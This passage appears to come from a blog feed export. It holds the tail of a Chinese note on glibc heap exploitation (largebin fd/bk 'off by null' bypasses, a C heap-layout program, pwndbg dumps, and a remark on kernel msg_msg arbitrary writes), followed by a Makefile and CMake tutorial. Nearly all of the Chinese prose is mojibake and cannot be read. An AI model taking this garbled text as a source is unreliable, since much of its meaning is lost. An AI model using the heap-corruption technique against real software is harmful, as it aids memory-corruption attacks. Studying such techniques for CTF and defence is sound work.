dï¼Œd-&gt;fd&#x3D;fã€‚è®©åè®©å…¶è¿›å…¥largebiné‡Œï¼Œd-&gt;fd&#x3D;fã€‚æ‹¿å›då°±è¡Œ<ul><li>è¿™é‡Œä¸ºä»€ä¹ˆä¸åœ¨unsortbiné‡Œï¼šç›´æ¥æ‹¿å‡ºdï¼Œä¼šå…ˆå°†fæ”¾å…¥largebinï¼Œç„¶åd-&gt;arena å½¢æˆé“¾è¡¨ã€‚å…ˆæ‹¿få†æ‹¿å‡ºd, d-&gt;arenaé“¾è¡¨ã€‚éƒ½ç ´åäº†fdæŒ‡é’ˆï¼ˆæ²¡æœ‰æŒ‡å‘å †ã€‚</li></ul></li></ul><p>å¯ä»¥ä½¿ç”¨è¿™æ®µä»£ç è°ƒè¯•ï¼Œæ²¡æœ‰æŒ‡é’ˆæ”¹å˜ï¼Œä¸»è¦çœ‹çš„æ˜¯å¯è¡Œæ€§ã€‚</p><ul><li>æœ€å¥½é‡æ–°åˆ†å¸ƒä¸€ä¸‹sizeï¼Œæœ€ç®€å•æ˜¯ä¿®æ”¹ <code>x0</code> å¤§å°ã€‚ä¿è¯få’Œc åªæœ‰æœ€åä¸€ä¸ªå­—èŠ‚ä¸åŒ</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *x0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *c = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  </span><br><span class="line">  <span class="type">void</span> *x1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">void</span> *x2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *e = <span class="built_in">malloc</span>(<span class="number">0x438</span>);   <span class="comment">// åˆ‡å‰² b-c</span></span><br><span class="line">  <span class="type">void</span> *f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">// æ¸…é™¤unsorted bin</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);        <span class="comment">// largebin è·å¾— p4</span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);        <span class="comment">// large bin è·å¾— p1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(f); <span class="comment">// p1-&gt;bk = </span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(f);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// large bin</span></span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bk bypass</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$2</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œbkéœ€è¦è¦†ç›–2byteæ‰è¡Œï¼Œå¯ä»¥ä¼˜åŒ–sizeï¼Œè®©å…¶åªè¦†ç›–1byteå°±è¡Œã€‚</span></span><br><span class="line">pwndbg&gt; x/4xg 0x0000555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555592a0: 0x00007ffff7e19ce0      0x0000555555559b10</span><br></pre></td></tr></table></figure><p>fd bypass</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œå°±æ˜¯fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000555555559f50</span><br><span class="line">0x555555559f50: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x555555559f60: 0x0000555555559b10      0x00007ffff7e1a0d0</span><br><span class="line">0x555555559f70: 0x0000555555559b10      0x0000555555559b10</span><br><span class="line">0x555555559f80: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel ?"></a>kernel ?</h2><ul><li>kernel å­˜åœ¨å¾ˆå¤šçš„ list_head ç»“æ„ä½“ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <strong>æ¡ä»¶ç«äº‰</strong> æ¥ä¿®æ”¹æŒ‡é’ˆï¼Œå€ŸåŠ©å¦‚åŒ msg_msg ç»“æ„ä½“æ¥è¿›è¡Œä»»æ„åœ°å€å†™</li></ul><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul><li><a href="https://www.anquanke.com/post/id/197635">How2Heapå †åˆ©ç”¨å­¦ä¹ ç¬”è®°ï¼ˆä¸‰ï¼‰ï¼šUnsafe_unlink</a></li><li><a href="https://xie-yuanhao.gitee.io/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-Unsafe%20Unlink/">PWN-å †åŸºç¡€ä¹‹Unsafe Unlink)</a></li><li><a href="https://blog.wjhwjhn.com/archives/193/">glibc 2.29-2.32 off by null bypass</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cmake ä½¿ç”¨</title>
      <link href="/2023/09/09/Cmake%20%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/09/09/Cmake%20%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç¼–å†™è‡ªåŠ¨åŒ–æ„å»ºè„šæœ¬</p></blockquote><span id="more"></span><h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><ul><li><p>åº”è¯¥å« GNU Makeï¼Œåœ¨Linux å¹³å°å¸¸ç”¨</p></li><li><p>æ‰“å°ä¿¡æ¯</p></li></ul><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸æ˜¾ç¤ºä¸­é—´è¿‡ç¨‹ä»¥åŠå‘½ä»¤</span></span><br><span class="line">@echo <span class="string">&quot;begin make&quot;</span></span><br><span class="line">@<span class="variable">$(CXX)</span>  <span class="variable">$^</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line">@echo <span class="string">&quot;build success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŠ¥é”™å¤„ç†, æŠ¥é”™åä¸ä¼šå‘ä¸‹æ‰§è¡Œï¼Œæˆ‘ä»¬åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ª `-` ç¬¦å·å°±è¡Œ</span></span><br></pre></td></tr></table></figure><ul><li>é¡¹ç›®ç»“æ„</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hello/</span><br><span class="line">â”œâ”€â”€ main.cpp</span><br><span class="line">â”œâ”€â”€ factorial.cpp</span><br><span class="line">â”œâ”€â”€ printhello.cpp</span><br><span class="line">â””â”€â”€ functions.h</span><br></pre></td></tr></table></figure><ul><li>æœ´ç´ ç‰ˆ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ main.cpp factorial.cpp printhello.cpp -o main</span><br><span class="line">./main</span><br></pre></td></tr></table></figure><h3 id="version1"><a href="#version1" class="headerlink" title="version1"></a>version1</h3><ul><li>tabè€Œä¸æ˜¯ç©ºæ ¼</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">hello: main.cpp printhello.cpp factorial.cpp</span></span><br><span class="line">g++ -o hello main.cpp printhello.cpp factorial.cpp</span><br></pre></td></tr></table></figure><h3 id="version2"><a href="#version2" class="headerlink" title="version2"></a>version2</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line"><span class="variable">$(CXX)</span> -o <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"><span class="section">main.o: main.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> -c main.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">printhello.o: printhello.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> -c printhello.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">factorial.o: factorial.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> -c factorial.cpp</span><br></pre></td></tr></table></figure><h3 id="version3"><a href="#version3" class="headerlink" title="version3"></a>version3</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wall warning all</span></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line"><span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHONY é¿å…å†²çªã€‚æ¯”å¦‚æœ‰ä¸€ä¸ª clean çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Ÿ</span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure><h3 id="version4"><a href="#version4" class="headerlink" title="version4"></a>version4</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶ä¸‹æ‰€æœ‰çš„cpp</span></span><br><span class="line">SRC = <span class="variable">$(<span class="built_in">wildcard</span> *.cpp)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„æ€ä¸º SRCä¸­çš„.cppæ›¿æ¢ä¸º.o</span></span><br><span class="line">OBJ = <span class="variable">$(<span class="built_in">patsubst</span> %.cpp, %.o, <span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line"><span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure><h2 id="CMake"><a href="#CMake" class="headerlink" title="CMake"></a>CMake</h2><ul><li>Linux å‘½ä»¤è¡Œï¼Œcmake <strong>ç”Ÿæˆ makefile</strong>ï¼Œç„¶ååœ¨ make ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cmake .</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><ul><li>Windows å‘½ä»¤è¡Œ</li></ul><ol><li>MinGW ç¯å¢ƒï¼Œä¸æ˜¯æˆ‘çš„é€‰æ‹©ï¼Œå› ä¸ºç”± MSVC</li><li>CMakeï¼Œé¦–å…ˆç”Ÿæˆç¼“å­˜ï¼Œæœ€åç¼–è¯‘</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake <span class="literal">-B</span> build</span><br><span class="line">cmake <span class="literal">--build</span> build</span><br></pre></td></tr></table></figure><ul><li>é…åˆ VsCode ä½¿ç”¨</li></ul><p>Ctrl + shift + p è¿›å…¥å‘½ä»¤ ï¼š cmake build å°±èƒ½ç”Ÿæˆbuild ç›®å½•ï¼Œå‡ºç°æˆ‘ä»¬çš„éœ€è¦çš„exeæ–‡ä»¶</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><ul><li>æœ€ç®€å•çš„ CmakeLists</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[[ cmake ç‰ˆæœ¬è¦æ±‚ ]]</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ å·¥ç¨‹å ]]</span></span><br><span class="line"><span class="keyword">project</span> (<span class="keyword">test</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ å¯æ‰§è¡Œæ–‡ä»¶ ]]</span></span><br><span class="line"><span class="keyword">add_executable</span> (main main.cpp)</span><br></pre></td></tr></table></figure><ul><li>set è®¾ç½®å˜é‡</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span>(SRC main.cpp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span> (main <span class="variable">$&#123;SRC&#125;</span>)</span><br></pre></td></tr></table></figure><ul><li>C&#x2F;C++ æ ‡å‡† æ¯”å¦‚ <code>-std=c99</code></li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span>(CMAKE_C_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br></pre></td></tr></table></figure><ul><li>file</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[[ åŒ¹é…æ‰€æœ‰çš„æ–‡ä»¶å ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB &lt;variable&gt; [LIST_DIRECTORIES <span class="keyword">true</span>[<span class="keyword">false</span>]] [RELATIVE &lt;path&gt; ] [CONFIGURE_DEPENDS] [&lt;globbing-expression&gt; ...])</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ å°† /usr/lib/inlcude/ ä¸‹æ‰€æœ‰ cæ–‡ä»¶ èµ‹å€¼ç»™ SRC ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB SRC /usr/lib/inlcude/*.c)</span><br></pre></td></tr></table></figure><ul><li>å®</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[[ å½“å‰CMakeListsæ‰€åœ¨æ–‡ä»¶å¤¹ ]]</span></span><br><span class="line">CMAKE_CURRENT_SOURCE_DIR </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ æœ€å¤–å±‚CMakeLists.txtæ‰€åœ¨ç›®å½• ]]</span></span><br><span class="line">CMAKE_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ ç¦» CMakeLists.txt æœ€è¿‘çš„ä¸€å±‚æ–‡ä»¶å¤¹ ]]</span></span><br><span class="line">PROJECT_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ äºŒè¿›åˆ¶æ–‡ä»¶è¾“å‡ºè·¯å¾„ï¼Œå¯è‡ªè¡Œset ]]</span></span><br><span class="line">EXECUTABLE_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ åº“è¾“å‡ºè·¯å¾„ ]]</span></span><br><span class="line">LIBRARY_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ ç¼–è¯‘å™¨ç¼–è¯‘é€‰é¡¹ ]]</span></span><br><span class="line">CMAKE_CXX_FLAGS</span><br></pre></td></tr></table></figure><ul><li>æ‰“å°ä¿¡æ¯</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message</span>()</span><br></pre></td></tr></table></figure><ul><li>åˆ¶ä½œé“¾æ¥åº“</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(&lt;name&gt; [STATIC | SHARED | MODULE]</span><br><span class="line">            [EXCLUDE_FROM_ALL]</span><br><span class="line">            [source1] [source2 ...])</span><br><span class="line"><span class="comment">#[[ STATIC(é™æ€åº“) SHARED(åŠ¨æ€åº“) MODULE(æ¨¡å—åº“) ]]</span></span><br></pre></td></tr></table></figure><ul><li>æ·»åŠ åº“ï¼Œç±»ä¼¼äº <code>gcc -lpthread</code></li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">target_link_libraries</span>(main pthread)</span><br></pre></td></tr></table></figure><h3 id="å¤šæ–‡ä»¶å¤¹"><a href="#å¤šæ–‡ä»¶å¤¹" class="headerlink" title="å¤šæ–‡ä»¶å¤¹"></a>å¤šæ–‡ä»¶å¤¹</h3><ul><li>åŒ…å«å¤´æ–‡ä»¶</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/<span class="keyword">include</span>/)</span><br></pre></td></tr></table></figure><ul><li><p>åŒ…å«æºæ–‡ä»¶ï¼šfile</p></li><li><p>å¤šä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ¯”å¦‚ç®€å•çš„ web æœåŠ¡å™¨</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">server</span><br><span class="line">|-- client</span><br><span class="line">||-- client.c</span><br><span class="line">||-- CMakeLists.txt</span><br><span class="line">|-- server</span><br><span class="line">||-- server.c</span><br><span class="line">||-- CMakeLists.txt</span><br><span class="line">|-- CMakeLists.txt</span><br></pre></td></tr></table></figure><ul><li>æ·»åŠ å­ç›®å½•ï¼Œè¦æ±‚å­ç›®å½•å¿…é¡»å«æœ‰ CmakeLists.txt</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[[ åŒ…å«å­ç›®å½• ]]</span></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)</span><br></pre></td></tr></table></figure><ul><li>æœ€å¤–å±‚</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (tftp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)                </span><br><span class="line"><span class="keyword">add_subdirectory</span>(server)</span><br></pre></td></tr></table></figure><ul><li>clent &amp; server</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (server)</span><br><span class="line"><span class="keyword">add_executable</span> (server server.cpp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[-----------------------------]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (client)</span><br><span class="line"><span class="keyword">add_executable</span> (client client.cpp)</span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘æˆåº“"><a href="#ç¼–è¯‘æˆåº“" class="headerlink" title="ç¼–è¯‘æˆåº“"></a>ç¼–è¯‘æˆåº“</h3><ul><li>å°†includeç¼–è¯‘æˆåº“ï¼Œç„¶ååœ¨ç¼–è¯‘æ—¶æŒ‡å®šåº“ (packet: ç½‘ç»œæ•°æ®åŒ…ï¼Œåœ¨client å’Œ server éƒ½ä¼šä½¿ç”¨)</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD_LIBRARY</span>(packet STATIC packet.cpp)</span><br></pre></td></tr></table></figure><ul><li>é¡¹ç›®æ·»åŠ åŠ¨æ€é“¾æ¥åº“ï¼šåŒ…å«åº“ + äºŒè¿›åˆ¶æ–‡ä»¶é“¾æ¥</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">link_directories</span>(</span><br><span class="line">    <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/lib</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(client PUBLIC packet)</span><br></pre></td></tr></table></figure><h3 id="æ·»åŠ cppæ–‡ä»¶"><a href="#æ·»åŠ cppæ–‡ä»¶" class="headerlink" title="æ·»åŠ cppæ–‡ä»¶"></a>æ·»åŠ cppæ–‡ä»¶</h3><ul><li>æˆ–è®¸æœ€ç®€å•ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–çš„å®å’Œå‡½æ•°è·å–cppæ–‡ä»¶æ·»åŠ </li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_executable</span> (client client.cpp <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/packet/packet.cpp)</span><br></pre></td></tr></table></figure><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><blockquote><p>ä¸»è¦æ˜¯åœ¨ vscode ä¸­é…åˆ LLVM å·¥å…·é“¾è¿›è¡Œdebugã€‚~~CLion å•¥éƒ½æœ‰ğŸ«¢ ~~</p></blockquote><p>ç¯å¢ƒï¼švscode + llvm + clangdæ’ä»¶ + code-lldbæ’ä»¶</p><ul><li>å†™å¥½ä¸€ä¸ªcmakeå·¥ç¨‹</li></ul><p>f5 